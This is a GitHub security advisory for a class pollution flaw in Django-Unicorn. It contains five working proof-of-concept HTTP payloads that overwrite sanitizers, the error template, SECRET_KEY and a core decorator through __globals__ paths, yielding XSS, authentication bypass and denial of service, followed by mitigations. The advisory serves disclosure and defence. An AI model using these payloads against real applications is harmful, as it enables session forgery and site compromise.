{
    "ghsaId": "GHSA-g9wf-5777-gq43",
    "severity": "CRITICAL",
    "summary": "Django-Unicorn Class Pollution Vulnerability, Leading to XSS, DoS and Authentication Bypass",
    "description": "# Summary\n\nDjango-Unicorn is vulnerable to python class pollution vulnerability, a new type of vulnerability categorized under [CWE-915](https://cwe.mitre.org/data/definitions/915.html). The vulnerability arises from the core functionality `set_property_value`, which can be remotely triggered by users by crafting appropriate component requests and feeding in values of second and third parameter to the vulnerable function, leading to arbitrary changes to the python runtime status. \n\nWith this finding, so far we've found at least five ways of vulnerability exploitation, stably resulting in Cross-Site Scripting (XSS), Denial of Service (DoS), and Authentication Bypass attacks in almost every Django-Unicorn-based application.\n\n# Analysis of Vulnerable Function\n\nBy taking a look at the vulnerable function `set_property_value` located at: `django_unicorn/views/action_parsers/utils.py`. You can observe the functionality is responsible for modifying a property value of an object. \n\nThe property is specified by a dotted form of path at the second parameter `property_name`, where nested reference to object is supported, and base object and the assigned value is given by the first parameter `component` and third parameter `property_value`.\n\n```python\n# https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/utils.py#L10\ndef set_property_value(\n    component,\n    property_name,\n    property_value\n) -> None:\n    ...\n    property_name_parts = property_name.split(\".\")\n    component_or_field = component\n    ...\n    for idx, property_name_part in enumerate(property_name_parts):\n        if hasattr(component_or_field, property_name_part):\n            if idx == len(property_name_parts) - 1:\n                ...\n                setattr(component_or_field, property_name_part, property_value)\n                ...\n            else:\n                component_or_field = getattr(component_or_field, property_name_part)\n                ...\n        elif isinstance(component_or_field, dict):\n            if idx == len(property_name_parts) - 1:\n                component_or_field[property_name_part] = property_value\n\t\t\t\t...\n            else:\n                component_or_field = component_or_field[property_name_part]\n\t\t\t\t...\n        elif isinstance(component_or_field, (QuerySet, list)):\n            property_name_part_int = int(property_name_part)\n\n            if idx == len(property_name_parts) - 1:\n                component_or_field[property_name_part_int] = property_value  # type: ignore[index]\n                ...\n            else:\n                component_or_field = component_or_field[property_name_part_int]  # type: ignore[index]\n                ...\n        else:\n            break\n```\n\nMeanwhile, this functionality can be directly triggered by a component request, one of the core functionalities of the project, by specifying the request type as `syncInput` and payload object would be fed in the dotted-path (2nd) parameter and assigned value (3rd) parameter of the vulnerable function.\n\n```json\nPOST /unicorn/message/COMPONENT_NAME\n\n{\n    \"id\": 123,\n    \"actionQueue\":[\n        {\n          \"type\": \"syncInput\",\n          \"payload\": {\n          \"name\": \"DOTTED_PATH\",\n          \"value\":\"ASSIGNED_VALUE\"\n          }\n    \t\t}\n    ],\n    \"data\": {XXX},\n    \"epoch\": \"123\",\n    \"checksum\": \"XXXX\"\n}\n```\n\nYou are now aware of that users from the remote can fully control the `property_name` and `property_value` of the vulnerable function. By default the preperty value overwrite can only be performed on the component object, which is always the first parameter of the function.\n\nHowever, the functionality failed to count in the situation where bad actors can modify the normal path to traverse to other objects in the python runtime, by leveraging the **magic attributes**. For example, if the `property_name` was set to `__init__.__globals__`, the component context would change to global context of the component module, which means we can modify any attributes of the objects that are located in the global scope of the component module. These objects also include other modules that have been imported in the component module, which comprises of a pollutable dependency chain.\n\nWith all these techniques introduced, we can now change any global objects including, global variables/instances/classes/functions of any module that is in a chain of dependency from the component module.\n\nThe next section, introduces the five exploitation gadgets found so far, leading to reflected XSS, stored XSS, authentication bypass and DOS attack. It uses a locally deployed `django-unicorn.com`  as demo website to showcase its large-scale impact.\n\n> Here, gadgets refer to the dependency code snippets by default introduced by django-unicorn and changing its status can result in an attack sequence, such as XSS.\n\n# Proof of Concept\n\n## #1 Reflected Cross-Site Scripting by Overwriting bs4 HTML sanitizer\n\nDjango-Unicorn implants the `EntitySubstitution` rule from beautifulsoup4 library into its [HTML formatter](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/components/unicorn_template_response.py#L125), formatting all the template response messages.\n\n![image-20250121163510422](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-35-11-a1aa5cfa196383e3a26636eb80bd85f0.png)\n\nWhile [this rule](https://github.com/akalongman/python-beautifulsoup/blob/master/bs4/dammit.py#L79) is specified in a global dictionary, we can exploit the class pollution vulnerability to overwrite it.\n\n```http\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": 123,\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<\",\n        \"value\": \"<img/src=1 onerror=alert('bs4_html_entity_bypass')>\"\n      }\n    }\n  ],\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"epoch\": \"123\",\n  \"checksum\": \"XXX\"\n}\n```\n\nIn this demonstration, we replaced the sanitizer's `<` item value with the XSS payload. whenever a template reponse renders a \"<\" in cleartext, it will be converted to the payload, leading to XSS attack.\n\n![bs4-xss](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-40-56-5ecbe8f2d39a6cc9a546744ca995b2d9.gif)\n\n## #2 Stored Cross-Site Scripting by Overwriting Unicorn Setting and [Django](https://github.com/django/django) Json Script Sanitizer\n\nThere is a script tag in the webpage. Among it, a `NAME` value is dynamically extracted both from the `MORPHER_NAMES` and `DEFAULT_MORPHER_NAME` variable in the [setting module](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/settings.py#L12). \n\n![image-20250121165007647](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-50-08-f2a628f8d06ba81c9bb71f78766cecb7.png)\n\nHowever, simply polluting these values can not lead to a stored XSS attack. Django by default escape some of the special characters into unicode sequences.\n\n![image-20250121164947336](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-49-47-b756d516b0b3e3d025d876963e1dbf6a.png)\n\nGoing through the source code of django, we found out the actual sanitizer located at `_json_script_escapes` variable at [django/utils/html.py](https://github.com/django/django/blob/862b7f98a02b7973848db578ff6d24ec8500fdb4/django/utils/html.py#L84).\n\n![image-20250121165247245](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-52-47-b60cd91f46ed89bc7b0a4b3f68521827.png)\n\nBy polluting this variable to clear it out, we finally achieve a stored XSS attack.\n\n![image-20250121165839892](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-58-40-97608fc15544d68edbfbdc8e61744b12.png)\n\nPoC:\n\n```http\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": \"3gpDSUcxzs1\",\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"checksum\": \"XXX\",\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django_unicorn.settings.MORPHER_NAMES\",\n        \"value\": [\n          \"</script><script>alert('django json unicode escape bypass + configuration overwrite')</script>\"\n        ]\n      }\n    },\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django_unicorn.settings.DEFAULT_MORPHER_NAME\",\n        \"value\": \"</script><script>alert('django json unicode escape bypass + configuration overwrite')</script>\"\n      }\n    },\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django.utils.html._json_script_escapes\",\n        \"value\": {}\n      }\n    }\n  ],\n  \"epoch\": 1737318956605,\n  \"hash\": \"jWGuTFzy\"\n}\n```\n\n![json_unicode_xss](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-58-59-f8da2463bbaa8de4f305c6fd2235172b.gif)\n\n## #3 Stored Cross-Site Scripting by Overwriting [Django](https://github.com/django/django) Error Page Source Code\n\nDjango by default stores its error page source code in a global variable named `ERROR_PAGE_TEMPLATE` at [django/views/defaults.py](https://github.com/django/django/blob/main/django/views/defaults.py#L16). \n\n![image-20250121170357900](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-03-58-86c9cf2abfa28f0e1ed479521af5be2e.png)\n\nBy polluting this variable to XSS payload. whenever a user triggers an error in the application, such as access an unexisting resource, the attack payload fires out.\n\n```http\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": 123,\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE\",\n        \"value\": \"<html><script>alert('error page pollution')</script></html>\"\n      }\n    }\n  ],\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"epoch\": \"123\",\n  \"checksum\": \"XXX\"\n}\n```\n\n![django-404-xss](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-05-05-e6ce889e7549243a5d8a60877fbb8cff.gif)\n\n## #4 Authentication Bypass by Overwriting [Django](https://github.com/django/django) Secret Key \n\nDjango secret key is typically used to sign and verify session cookies and other security related mechanism. By polluting its runtime value to attacker intended, attacker can forge session cookies to login in to the system as any user.\n\nEven though, django-unicorn.com doesn't have an authentication layer, you can still observe a successful secret key pollution by inspecting the changed checksum in the HTTP response, since the checksum is generated by encrypting the data field in the request body with the secret key.\n\n```HTTP\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": 123,\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY\",\n        \"value\": \"test\"\n      }\n    }\n  ],\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"epoch\": \"123\",\n  \"checksum\": \"XXX\"\n}\n```\n\n![authentication_bypass](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-12-20-424da7c5c960471600863828fba93c4a.gif)\n\n## #5 Denial of Service by Overwriting `timed` Decorator Method\n\nThe [timed](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/decorators.py#L9) decorator is used to modify many important functions in the django-unicorn, such as [_call_method_name](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/call_method.py#L122).\n\n![image-20250121171823756](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-18-24-0e1cec22199ab2dc1bc9bbcb76d2dcd9.png)\n\nBy polluting the core decorator method `timed`  to a string, we make a function call always call a uncallable string, leading to the backend crashed, thus denial of service attack.\n\n```http\nPOST /unicorn/message/todo HTTP/1.1\n\n{\n  \"id\": 123,\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": {\n        \"name\": \"__init__.__globals__.timed\",\n        \"value\": \"X\"\n      }\n    }\n  ],\n  \"data\": {\n    \"task\": \"\",\n    \"tasks\": []\n  },\n  \"epoch\": \"123\",\n  \"checksum\": \"XXX\"\n}\n```\n\n![dos_attack](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-20-39-20ab579669a459c7fb54afeab21dcd4e.gif)\n\n# Mitigation\n\nThe patch could be:\n\n- Blocking paths that start with `__`,  which represent **double under (dunder)** or **magic variables/methods**\n- Set a blacklist for the path, such as `RESTRICTED_KEYS = (\"__globals__\", \"__builtins__\")` adopted by [pydash](https://github.com/dgilland/pydash/blob/f4112f61ddb02e5181e781709d775838c9978b97/src/pydash/helpers.py#L211).\n\n# Related Materials\n\nFor more information about class pollution please refer to:\n\n[1] [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)\n\n[2] [Report: Class Pollution leading to RCE in pydash](https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca)\n\n[3] [Blog: Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)\n\n[4] [Blog: Class Pollution Gadgets in Jinja Leading to RCE](https://www.offensiveweb.com/docs/programming/python/class-pollution/)",
    "permalink": "https://github.com/advisories/GHSA-g9wf-5777-gq43",
    "publishedAt": "2025-02-03T15:48:53Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-g9wf-5777-gq43"
        },
        {
            "type": "CVE",
            "value": "CVE-2025-24370"
        }
    ]
}